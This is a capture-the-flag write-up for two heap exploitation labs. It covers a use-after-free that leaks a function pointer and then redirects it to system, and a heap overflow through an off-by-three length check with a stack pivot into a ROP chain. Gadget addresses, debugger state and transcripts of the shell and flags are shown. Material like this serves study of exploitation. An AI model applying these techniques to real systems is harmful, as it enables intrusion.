## lab7C

This is our first ```heap``` exploitation challenge!

We have 2 structs here:

```c
struct data {
    char reserved[8];
    char buffer[20];
    void (* print)(char *);
};

struct number {
    unsigned int reserved[6];               // implement later
    void (* print)(unsigned int);
    unsigned int num;
};
```

Notice the comment. Hmmm, what's going on?

Continuing in our source code analysis, we see a bunch of identical functions under different names.

* The functions ```small_str``` and ```big_str``` both receive a character pointer as an argument and prints the string located at that address.
* The functions ```small_num``` and ```big_num``` both receive an integer pointer as an argument and prints the number located at that address.

Glancing over the ```print_menu``` function, we have a clue about what these binary does. There are several options in the menu:

```c
void print_menu()
{
    printf("-- UAF Playground Menu ----------------------\n"
           "1. Make a string\n"
           "2. Make a number\n"
           "3. Delete a string\n"
           "4. Delete a number\n"
           "5. Print a string\n"
           "6. Print a number\n"
           "7. Quit\n"
           "---------------------------------------------\n"
           "Enter Choice: ");
}
```

Since this is a ```heap``` challenge, you bet that every ```string``` or ```number``` creation happens on the ```heap```, every deletion is done by calling ```free``` and printing is done by calling the function member of each struct.

In the ```main``` function there is an array of ```struct data``` and an array of ```struct number```, each with 6 elements. Since apparently insertion is done beginning with index 1, we can only keep in memory 5 strings and 5 numbers at maximum.

The chosen function in the structure is determined by the length of the string or the value of the number.

```c
tempstr->print = strlen(tempstr->buffer) > 10 ? big_str : small_str;

tempnum->print = tempnum->num > 0x31337 ? big_num : small_num;
```

With the analysis out of the way, how do we exploit this? Well, since we have a bunch of functions that call ```printf```, we immediately think of trying to perform a ```info leak``` in order to find the address of ```system```.

We know that function addresses are 4 bytes here. Since an integer is exactly 4 bytes, we will have to somehow set ```number->num``` to have the value of a function address. We will do so by a ```use after free``` vulnerability.

When printing a number, an ```if statement``` is perfomed:

```c
if(index < MAX_NUM && numbers[index])
                numbers[index]->print(numbers[index]->num);
```

Our ```index``` will definitely be smaller than ```MAX_NUM``` and since calling ```free``` only sets a ```chunk``` on the ```heap``` as "free" but doesn't actually modify its data, you bet that we will pass the second condition too.

Now, how do we get ```number->num``` to have a function address as a value? We will overlap it with a ```data``` object on the ```heap```. There are exactly ```28 bytes``` of space between the beginning of an object of ```struct data``` and its ```print function``` and exactly ```28 bytes``` between the beginning of an object of ```struct number``` and its variable ```num```.

We will ```make``` a ```number```, ```free``` it, ```make``` a ```string``` and call a function to ```print num```. And voila! We get the value of either ```small_srt``` or ```big_str```, depending on your input. Now we can calculate the address for ```system```.

Now, we have to do the reverse. We can store in ```data->buf``` the string ```"/bin/sh\x00"```, change ```data->print``` with ```system``` and call the function. We have to allocate a ```string``` then ```free``` it then allocate a ```number``` with the ```number->num``` being the address of ```system```.

Since at this point we have a ```data struct``` on our heap, we will only need to ```free``` it and allocate a ```number``` on top of it and call the ```print``` function. Make sure that when you first allocated this ```data struct```, your ```buf``` contains ```"/bin/sh\x00"```. Now simply call the print function and voila!

```bash
lab7C@warzone:/tmp/transcen/lab07$ python expl7C.py
[+] Starting program '/levels/lab07/lab7C': Done
[*] Switching to interactive mode

-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: String index to print: $ whoami
lab7A
$ cat /home/lab7A/.pass
us3_4ft3r_fr33s_4re_s1ck
```
## lab7A

Looking at the function ```print_menu```, we can see what this binary is all about!

```c
void print_menu()
{
    printf("+---------------------------------------+\n"
           "|        Doom's OTP Service v1.0        |\n"
           "+---------------------------------------+\n"
           "|------------ Services Menu ------------|\n"
           "|---------------------------------------|\n"
           "| 1. Create secure message              |\n"
           "| 2. Edit secure message                |\n"
           "| 3. Destroy secure message             |\n"
           "| 4. Print message details              |\n"
           "| 5. Quit                               |\n"
           "+---------------------------------------+\n");
}
```

And there is also a ```struct msg``` here.

```c
struct msg {
    void (* print_msg)(struct msg *);
    unsigned int xor_pad[MAX_BLOCKS];
    unsigned int message[MAX_BLOCKS];
    unsigned int msg_len;
};
```

We have several options, each having their own corresponding function in the source code. After analysing each of them, we can see that the code is pretty cautious when allocating and freeing data on the ```heap```.

Whenever we create a message, the function ```create_message``` makes sure that it erases everything on the heap by calling ```memset```.

```c
new_msg = malloc(sizeof(struct msg));
memset(new_msg, 0, sizeof(struct msg));
```

On top of it all, there are several calls to ```rand``` to initialize values in ```msg.xor_pad[32]``` array. What follows is a call to ```encdec_message```, where it ```xors``` our ```message``` with the ```padding```.

```c
void encdec_message(unsigned int * message, unsigned int * xor_pad)
{
    int i = 0;
    for(i = 0; i < MAX_BLOCKS; i++)
        message[i] ^= xor_pad[i];
}
```

What should we do? Well it's pretty clear that, at some point, we will need to take control over the ```function pointer``` present in one of the chunks. That is, we need to find a way to modify its value.

If we look at the function ```edit_message```, we can see a less-obvious vulnerability.

```c
/* clear old message, and read in a new one */
memset(&messages[i]->message, 0, BLOCK_SIZE * MAX_BLOCKS);
read(0, &messages[i]->message, messages[i]->msg_len);
```

We can see that there are no checks to ```msg_len``` since it was already checked when creating the chunk. What that means is that, if we can somehow modify the ```msg_len``` value AFTER the check, which is this:

```c
#define MAX_BLOCKS 32
#define BLOCK_SIZE 4

/* make sure the message length is no bigger than the xor pad */

if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
    new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;
```

We can basically overflow into the ```next chunk```, overflowing right onto its ```function pointer```! So that means, we would have to have at least ```2 allocated chunks``` on our ```heap```.

How do we change ```msg_len```? Looking at the struct, it is placed after our ```int message[32] array```. We then kind of have a paradox - we need to overflow the ```array``` to change to ```msg_len``` value but we need to change the ```msg_len``` value to overflow the ```array```. Hmmmm?

Let's look at the assembly code in ```gdb```. This is the assembly equivalent of the previous ```if statement```.

``` asm
   0x080491ea <+280>:    cmp    eax,0x83
   0x080491ef <+285>:    jbe    0x80491fe
   0x080491f1 <+287>:    mov    eax,DWORD PTR [ebp-0x10]
   0x080491f4 <+290>:    mov    DWORD PTR [eax+0x104],0x80
   0x080491fe <+300>:    mov    DWORD PTR [esp],0x80c05db
```

Oh look at that! Instead of comparing ```EAX``` to``` BLOCK_SIZE * MAX_BLOCKS = 128```, it compares it to ```0x83 = 131```! This seems like a compilation error. Nonetheless, if we specify the ```msg_len``` to be 131, it will pass the conditional statement successfully, meaning we can overflow right into the ```function pointer``` of the next chunk!

Alright, now we can change the ```function pointer``` to anything we want. We have control over ```EIP```. Now, we need to make it spawn a ```shell```. I couldn't find the ```system``` function in the binary, therefore we cannot perform a ```ret2libc``` attack.

Looking over ```checksec```...

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

It seems that ```PIE``` is disabled, so that means we can craft a ```ropchain```, put it on the ```heap```, ```pivot``` to it and spawn a ```shell``` this way!

Using ```ROPgadget```, I automated the crafting of a ```ropchain```. Now all that is left is to ```pivot```. First, let's look at what happens when we call our ```function pointer```.

I set a break point before any ```print_message``` instruction was executed. I will allocate ```2 chunks``` on the heap and call ```print_message``` to read the ```second``` one. These will be the state of our ```registers``` and ```stack```.

```asm
[----------------------------------registers-----------------------------------]
EAX: 0x8048fd3 (:    push   ebp)
EBX: 0x80481a8 (<_init>:    push   ebx)
ECX: 0xbffff5ad --> 0x4008000a
EDX: 0x80f1ae8 --> 0x8048fd3 (:    push   ebp)
ESI: 0x0
EDI: 0x80ecfbc --> 0x8069190 (<__stpcpy_sse2>:    mov    edx,DWORD PTR [esp+0x4])
EBP: 0xbffff5d8 --> 0xbffff608 --> 0x8049e70 (<__libc_csu_fini>:    push   ebx)
ESP: 0xbffff58c --> 0x8049521 (:    mov    eax,0x0)
EIP: 0x8048fd3 (:    push   ebp)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048fd0 :    pop    ebx
   0x8048fd1 :    pop    ebp
   0x8048fd2 :    ret   
=> 0x8048fd3 :    push   ebp
   0x8048fd4 :    mov    ebp,esp
   0x8048fd6 :    sub    esp,0x28
   0x8048fd9 :    mov    eax,DWORD PTR [ebp+0x8]
   0x8048fdc :    mov    DWORD PTR [ebp-0x1c],eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff58c --> 0x8049521 (:    mov    eax,0x0)
0004| 0xbffff590 --> 0x80f1ae8 --> 0x8048fd3 (:    push   ebp)
0008| 0xbffff594 --> 0x0
0012| 0xbffff598 --> 0xa ('\n')
0016| 0xbffff59c --> 0x80ed240 --> 0xfbad2887
0020| 0xbffff5a0 --> 0x80ed240 --> 0xfbad2887
0024| 0xbffff5a4 --> 0x29 (')')
0028| 0xbffff5a8 --> 0x1
[------------------------------------------------------------------------------]
```

Usually in these cases, we need to rely on the values in the ```registers to pivot```. Looking at ```EDX```, it's a pointer directly to our ```second chunk```! It points to the ```function pointer``` as expected, since it is at the bottom of the object. Not the best but it's clear that we have to start somehow with ```EDX```. We need to move the value from ```EDX``` to ```ESP``` somehow and jump over the ```function pointer``` on the heap into our ropchain.

Unfortunately, looking at the ```gadgets```, we don't have any to move the data from ```EDX``` into our ```ESP```. That means we cannot do it in one go, we need to call more ```gadgets```.

Looking at ```print_index``` we actually have a ```buffer``` which we can ```pivot``` to as an ```intermediate```! The ```buffer``` is originally intended to be used to find out which ```index``` we want to ```print``` the contents of.

```c
char numbuf[32];
unsigned int i = 0;

/* get message index to print */
printf("-Input message index to print: ");
fgets(numbuf, sizeof(numbuf), stdin);
i = strtoul(numbuf, NULL, 10);
```

Alright, so it is decided, we have to ```pivot``` to the ```numbuf``` buffer, where we will call more ```gadgets``` and ```pivot``` further onto the ```heap``` and, eventually, into our ```ropchain```.

These are our boys.
```asm
0x0804a097 add esp, 0x2c
0x080671c4 mov_eax, edx
0x0804bb6c xchg eax, esp
```

The first ```gadget``` will act as our ```function pointer``` in the ```second chun```k, while the other 2 will be in ```numbuf``` and act as our ```intermediate pivot```.

Note that we will also a ```3rd pivot``` when we get onto the ```heap```, since the ```function pointer``` will called again. Therefore, we need to put ```0x2c padding``` between our ```function pointer``` and ```ropchain```.

```bash
lab7A@warzone:/tmp/transcen/lab07$ python expl7A.py
[+] Opening connection to 172.16.37.128 on port 7741: Done
[*] Switching to interactive mode

+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: -----------------------------------------
-Input message index to print: $ whoami
lab7end
$ cat /home/lab7end/.pass
0verfl0wz_0n_th3_h3ap_4int_s0_bad
```
